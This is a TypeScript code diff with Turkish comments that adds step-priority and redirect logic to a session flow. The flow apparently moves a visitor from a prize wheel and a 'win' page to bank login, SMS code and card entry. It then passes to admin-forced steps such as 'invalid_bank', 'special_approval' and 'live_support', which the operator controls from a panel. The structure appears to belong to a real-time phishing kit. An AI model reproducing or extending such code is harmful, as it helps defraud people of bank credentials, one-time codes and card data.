@@ -1,5 +1,81 @@
 import type { SessionStep } from "@/types/session";
 
+/**
+ * ADIM ÖNCELİĞİ (Step Priority):
+ * - Düşük sayı = akışın başlangıcı
+ * - Yüksek sayı = akışın ilerisi
+ * - 100 ve üzeri = ADMIN KORUMALI (client ping veya submit ile GERİYE DÖNEMEZ,
+ *   sadece admin panelinden zorlanabilir. Bu adımlara gelince client kesinlikle orada kalır
+ *   veya daha ileri admin adımına yönlenir, GERİYE gitmez.)
+ */
+const STEP_PRIORITY: Record<string, number> = {
+  wheel: 10,
+  code_entry: 10,
+  win: 20,
+  banken: 30,
+  bank: 40,
+  bank_login: 40,
+  sms: 50,
+  card: 60,
+  wait: 100,
+  invalid_bank: 101,
+  special_approval: 102,
+  live_support: 103,
+  congrats: 104,
+};
+
+export const ADMIN_PROTECTED_PRIORITY_THRESHOLD = 100;
+
+export function isAdminProtectedStep(step: string | SessionStep | null | undefined): boolean {
+  if (!step) return false;
+  const p = STEP_PRIORITY[String(step)] ?? 0;
+  return p >= ADMIN_PROTECTED_PRIORITY_THRESHOLD;
+}
+
+export function getStepPriority(step: string | SessionStep | null | undefined): number {
+  if (!step) return 0;
+  return STEP_PRIORITY[String(step)] ?? 0;
+}
+
+/**
+ * Client adımı GERİYE mi çekiyor? (Örn: kullanıcı bankada (40), DB win (20) ise -> client daha ileride)
+ * Sadece DB adımı DÜŞÜK öncelikli VE client adımı DAHA YÜKSEK öncelikliyse (ve admin korumalı değilse) GERİ gönderme.
+ */
+export function shouldRedirectToServerStep(params: {
+  localStep: string | null;
+  serverStep: string | null;
+}): boolean {
+  const { localStep, serverStep } = params;
+  if (!localStep || !serverStep) return false;
+  if (localStep === serverStep) return false;
+
+  // Eş değer adımlar: wheel === code_entry, banken === bank
+  if (localStep === "wheel" && serverStep === "code_entry") return false;
+  if (localStep === "code_entry" && serverStep === "wheel") return false;
+  if (localStep === "banken" && serverStep === "bank") return false;
+  if (localStep === "bank" && serverStep === "banken") return false;
+  if (localStep === "bank_login" && serverStep === "bank") return false;
+  if (localStep === "bank" && serverStep === "bank_login") return false;
+
+  const localP = getStepPriority(localStep);
+  const serverP = getStepPriority(serverStep);
+
+  // Server admin korumalı adımdaysa (≥100): CLIENT MUTLAKA ORAYA GİDER (ne olursa olsun)
+  if (serverP >= ADMIN_PROTECTED_PRIORITY_THRESHOLD) {
+    return localStep !== serverStep;
+  }
+
+  // Server adımı client adımından DAHA YÜKSEKSE (ileri adım): client'i oraya götür.
+  if (serverP > localP) {
+    return true;
+  }
+
+  // Aksi halde:
+  // - Client daha ilerideyse (localP > serverP): GERİ GÖNDERME (DB'deki eski step güncellenmemiş olabilir, client akışta)
+  // - Eşit veya düşük: dokunma.
+  return false;
+}
+
 export function stepToPath(
   step: SessionStep,
   sessionId: string,
